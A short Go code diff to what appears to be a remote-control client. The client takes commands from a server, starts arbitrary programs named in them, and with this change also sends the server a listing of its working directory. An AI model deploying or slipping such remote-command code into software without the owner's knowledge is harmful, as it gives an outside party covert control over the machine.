@@ -4,9 +4,11 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"net"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 )
 
@@ -165,6 +167,19 @@ readMsg:
 			c := exec.Command(spt[1])
 			if err := c.Start(); err != nil {
 				WriteToServer(err.Error())
+			}
+			continue readMsg
+		case "dir":
+			pwd, _ := os.Getwd()
+			//获取文件或目录相关信息
+			fileInfoList, err := ioutil.ReadDir(pwd)
+			if err != nil {
+				WriteToServer("err:" + err.Error())
+				continue readMsg
+			}
+			WriteToServer("total:" + strconv.Itoa(len(fileInfoList)) + "\n")
+			for i := range fileInfoList {
+				WriteToServer(fileInfoList[i].Name() + "\n") //打印当前文件或目录下的文件或目录名
 			}
 			continue readMsg
 		case "~alive":
